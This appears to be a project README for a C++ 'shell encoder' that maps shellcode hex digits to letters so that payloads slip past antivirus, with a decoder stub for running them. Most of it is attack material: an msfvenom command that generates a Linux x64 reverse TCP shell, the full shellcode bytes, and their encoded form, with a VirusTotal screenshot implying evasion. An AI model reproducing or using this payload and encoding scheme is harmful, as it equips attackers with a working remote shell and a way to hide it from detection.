Shell Encoder
============

A minimalist Custom Shellencoder in C++. All Hex Chars (0-F) in Shellcode are mapped to ASCII (g-v).
You can change the key-map in `Source/enc.cpp` and `Source/dec.cpp`. Make sure the key-map match,
a single mismatch screws up everything.

Tested on my ArchLinux instance (x64).


The POC is far from perfect (even though it works), roll with the idea and write a better code :)

### Let's Play "Game of Exec"

Write a Shellexec with an encoded Shellcode, use the `Source/dec.cpp` as the decoder stab. You can compile for Windows 
in Linux using MinGW as well. 

### Sample Output
```bash
root@hell # msfvenom -p linux/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=443 -f c

unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x01\xbb\x00\x00\x00\x00\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
```

####Encoded
```bash
# ./encoder

Enter Shellcode: \x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02
\x00\x01\xbb\x00\x00\x00\x00\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03
\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e
\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05

Encoded Shellcode
zpmqzpiwzplozpwwzpmqzpgizplfzpmqzpghzplvzpgfzpglzpkozpwnzpkozprwzpgizpggzpghzprrzpg
gzpggzpggzpggzplhzpkozpowzpvmzpmqzphgzplqzpmqzpiqzplozpgfzpglzpmqzpgjzplvzpkozpffzp
svzpmqzpihzplozpgfzpglzpnlzpfmzpmqzpjrzplozpwwzpkozprrzpifzpmizpmwzpmvzpifzpnjzpmoz
pggzpljzpkozpowzpvnzplizplnzpkozpowzpvmzpgfzpgl

```
####Antivirus?
![Virustotal](https://s30.postimg.org/3mio3erep/image.png)

